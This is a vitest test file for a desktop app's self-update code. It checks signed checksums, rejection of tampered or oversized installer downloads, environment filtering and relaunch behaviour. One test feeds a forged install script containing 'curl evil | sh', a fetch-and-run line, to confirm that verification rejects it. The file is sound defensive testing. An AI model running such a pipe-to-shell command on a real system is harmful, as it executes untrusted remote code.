import { createHash, generateKeyPairSync, sign } from 'node:crypto'
import { blake2b } from '@noble/hashes/blake2.js'
import { describe, expect, test, vi } from 'vitest'
import { spawn } from 'node:child_process'
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  installerEnv,
  prepareUpdate,
  relaunchAfterExit,
  runInstaller,
} from '../../src/desktop/selfUpdate'

const VERSION = '1.2.3'
const BASE = `https://github.com/samuelba/ukemi/releases/download/v${VERSION}`
const SCRIPT = 'echo installed\n'
const APP_HASH = 'b'.repeat(64)
const scriptHash = createHash('sha256').update(SCRIPT).digest('hex')
const SUMS = `${scriptHash}  install.sh\n${APP_HASH}  Ukemi-${VERSION}-linux-x64.tar.gz\n`

const { publicKey, privateKey } = generateKeyPairSync('ed25519')
const keyId = Buffer.from('0102030405060708', 'hex')
const raw = publicKey.export({ format: 'der', type: 'spki' }).subarray(-32)
const PUBLIC_KEY = Buffer.concat([Buffer.from('Ed'), keyId, raw]).toString('base64')

function minisig(data: string, comment = `ukemi ${VERSION}`): string {
  const signed = sign(null, blake2b(Buffer.from(data)), privateKey)
  const global = sign(null, Buffer.concat([signed, Buffer.from(comment)]), privateKey)
  const line = Buffer.concat([Buffer.from('ED'), keyId, signed]).toString('base64')
  return `untrusted comment: test\n${line}\ntrusted comment: ${comment}\n${global.toString('base64')}\n`
}

function server(overrides: Record<string, string | Response> = {}): typeof fetch {
  const files: Record<string, string | Response> = {
    SHA256SUMS: SUMS,
    'SHA256SUMS.minisig': minisig(SUMS),
    'install.sh': SCRIPT,
    ...overrides,
  }
  return vi.fn(async (url: string | URL | Request) => {
    const name = String(url).slice(BASE.length + 1)
    const file = String(url).startsWith(`${BASE}/`) ? files[name] : undefined
    if (file === undefined) {
      return new Response('', { status: 404 })
    }
    return typeof file === 'string' ? new Response(file) : file
  }) as unknown as typeof fetch
}

const prepare = (fetcher: typeof fetch) =>
  prepareUpdate(VERSION, { fetch: fetcher, publicKey: PUBLIC_KEY })

describe('prepareUpdate', () => {
  test('returns the verified script and checksums', async () => {
    const update = await prepare(server())
    expect(new TextDecoder().decode(update.script)).toBe(SCRIPT)
    expect(update.sums).toBe(SUMS)
  })

  test('rejects a script that is not the signed one', async () => {
    await expect(prepare(server({ 'install.sh': 'curl evil | sh\n' }))).rejects.toThrow(/checksum/)
  })

  test('rejects checksums that are not signed', async () => {
    const forged = SUMS.replace(APP_HASH, 'c'.repeat(64))
    await expect(prepare(server({ SHA256SUMS: forged }))).rejects.toThrow(/not signed/)
  })

  test('rejects a release without a signature', async () => {
    const missing = new Response('', { status: 404 })
    await expect(prepare(server({ 'SHA256SUMS.minisig': missing }))).rejects.toThrow(
      /SHA256SUMS\.minisig.*404/,
    )
  })

  test('rejects a signature of another version', async () => {
    const old = minisig(SUMS, 'ukemi 1.2.2')
    await expect(prepare(server({ 'SHA256SUMS.minisig': old }))).rejects.toThrow(/1\.2\.2/)
  })

  test('rejects an oversized download', async () => {
    const huge = 'x'.repeat(1024 * 1024 + 1)
    await expect(prepare(server({ 'install.sh': huge }))).rejects.toThrow(/too large/)
  })
})

describe('installerEnv', () => {
  test('passes only what the installer needs', () => {
    const env = installerEnv(
      {
        HOME: '/home/me',
        PATH: '/usr/bin:/bin',
        ELECTRON_RUN_AS_NODE: '1',
        XDG_DATA_HOME: '/data',
        XDG_BIN_HOME: '/bin-home',
        TMPDIR: '/var/tmp',
        LANG: 'C.UTF-8',
        UKEMI_FORCE: '1',
        SECRET_TOKEN: 'nope',
      },
      VERSION,
      SUMS,
    )

    expect(env).toEqual({
      HOME: '/home/me',
      PATH: '/usr/bin:/bin',
      XDG_DATA_HOME: '/data',
      XDG_BIN_HOME: '/bin-home',
      TMPDIR: '/var/tmp',
      LANG: 'C.UTF-8',
      UKEMI_VERSION: VERSION,
      UKEMI_SHA256SUMS: SUMS,
    })
  })
})

describe('relaunchAfterExit', () => {
  test('starts the installed version only after the old process has exited', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'ukemi-relaunch-'))
    const marker = join(dir, 'started')
    const launcher = join(dir, 'ukemi')
    writeFileSync(launcher, `#!/bin/sh\ntouch "${marker}"\n`, { mode: 0o755 })
    const old = spawn('sleep', ['0.5'])
    try {
      relaunchAfterExit(launcher, old.pid!, { PATH: process.env.PATH! })
      await new Promise((done) => setTimeout(done, 200))
      expect(existsSync(marker)).toBe(false)
      await new Promise((done) => old.on('exit', done))
      await vi.waitFor(() => expect(existsSync(marker)).toBe(true), { timeout: 3000 })
    } finally {
      old.kill()
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test('passes the arguments on to the new process', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'ukemi-relaunch-'))
    const marker = join(dir, 'args')
    const launcher = join(dir, 'ukemi')
    writeFileSync(launcher, `#!/bin/sh\nprintf '%s\\n' "$@" >"${marker}"\n`, { mode: 0o755 })
    try {
      relaunchAfterExit(launcher, 2 ** 22 + 1, { PATH: process.env.PATH! }, ['my repo', '-x'])
      await vi.waitFor(() => expect(readFileSync(marker, 'utf8')).toBe('my repo\n-x\n'), {
        timeout: 3000,
      })
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('runInstaller', () => {
  const update = (script: string) => ({
    script: new TextEncoder().encode(script),
    sums: SUMS,
  })
  const env = { PATH: process.env.PATH, UKEMI_VERSION: VERSION }

  test('feeds the script to sh with the given environment', async () => {
    const script = `[ "$UKEMI_VERSION" = "${VERSION}" ] || exit 9\n`
    await expect(runInstaller(update(script), env)).resolves.toBeUndefined()
  })

  test("reports the installer's own explanation", async () => {
    const script = 'echo "ukemi install: no space left" >&2\nexit 1\n'
    await expect(runInstaller(update(script), env)).rejects.toThrow(/^no space left$/)
  })

  test('reports the exit code when the installer gives no reason', async () => {
    await expect(runInstaller(update('exit 7\n'), env)).rejects.toThrow(/7/)
  })
})
